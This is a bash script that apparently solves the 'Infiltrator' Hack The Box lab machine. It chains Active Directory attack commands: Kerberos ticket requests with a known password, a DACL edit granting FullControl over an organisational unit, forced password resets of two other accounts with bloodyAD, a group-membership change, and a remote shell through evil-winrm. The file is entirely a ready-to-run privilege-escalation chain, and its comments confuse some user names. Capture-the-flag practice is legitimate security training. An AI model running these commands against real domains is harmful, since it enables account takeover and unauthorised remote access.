#!/bin/bash
# Box IP 
dcip="10.10.11.31"

#Get a kerberos ticket for user d.anderson and add d.anderson to the Marketing Digital group found in bloodhound-python.
impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!'
export KRB5CCNAME=d.anderson.ccache
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip infiltrator.htb

#change e.rodriguez's password
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "d.anderson" -p 'WAT?watismypass!' set password "e.rodriguez" 'WAT?watismypass!'

#get a ticket as d.rodriguez
impacket-getTGT infiltrator.htb/e.rodriguez:'WAT?watismypass!'
export KRB5CCNAME=e.rodriguez.ccache

#add d.rodriguez to the Chiefs Marketing OU
bloodyAD --host dc01.infiltrator.htb --dc-ip $dcip -u e.rodriguez -k -d infiltrator.htb add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez

#use e.rodriguez's account to change m.harris's password
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "e.rodriguez" -p 'WAT?watismypass!' set password "m.harris" 'WAT?watismypass!'

#get a TGT as m.harris
impacket-getTGT infiltrator.htb/m.harris:'WAT?watismypass!'
export KRB5CCNAME=./m.harris.ccache

#login as m.harris
evil-winrm -i dc01.infiltrator.htb -u "m.harris" -r INFILTRATOR.HTB
